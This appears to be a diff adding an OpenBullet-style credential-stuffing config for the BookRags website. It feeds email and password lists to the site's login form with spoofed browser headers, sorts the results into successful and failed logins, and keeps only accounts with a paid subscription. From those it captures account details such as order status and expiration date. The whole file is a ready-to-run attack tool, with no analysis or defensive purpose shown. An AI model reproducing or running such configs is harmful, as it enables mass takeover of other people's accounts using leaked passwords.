@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "BookRags",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-07T16:44:48.2617347+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_LOGIN_(POST) REQUEST POST "https://www.bookrags.com/qa/login.php?step=submit&finishpg=https%3A%2F%2Fwww.bookrags.com%2Fqa%2Fregister.php%3Fcontext%3Dheader&cancelpg=https%3A%2F%2Fwww.bookrags.com%2Fqa%2Fregister.php%3Fcontext%3Dheader" AutoRedirect=TRUE 
+  CONTENT "edEmailOrName=<USER>&edPW=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://www.bookrags.com/qa/login.php?finishpg=https%3A%2F%2Fwww.bookrags.com%2Fqa%2Fregister.php%3Fcontext%3Dheader" 
+  HEADER "Origin: https://www.bookrags.com" 
+#CHECK_FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Couldn't log in" 
+  KEYCHAIN Success OR 
+    KEY "Sign Out" 
+#REQUEST_ACCOUNT_INFO_(GET) REQUEST GET "https://www.bookrags.com/my-account/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#FILTER_ACCOUNTS KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "You do not have a subscription to BookRags." 
+#PARSE_TEACHER PARSE "<SOURCE>" LR "field=\"teacher\">" "</span>" Recursive=FALSE -> CAP "TEACHER" "" "" 
+#PARSE_CANCELED PARSE "<SOURCE>" CSS "[class=order-status]" "innerHTML" 0 -> CAP "ORDERSTATUS" "" "" 
+PARSE "<SOURCE>" LR "			<td><strong>" "</strong></td>" Recursive=FALSE -> CAP "EXPIRATIONDATE" "" "" 
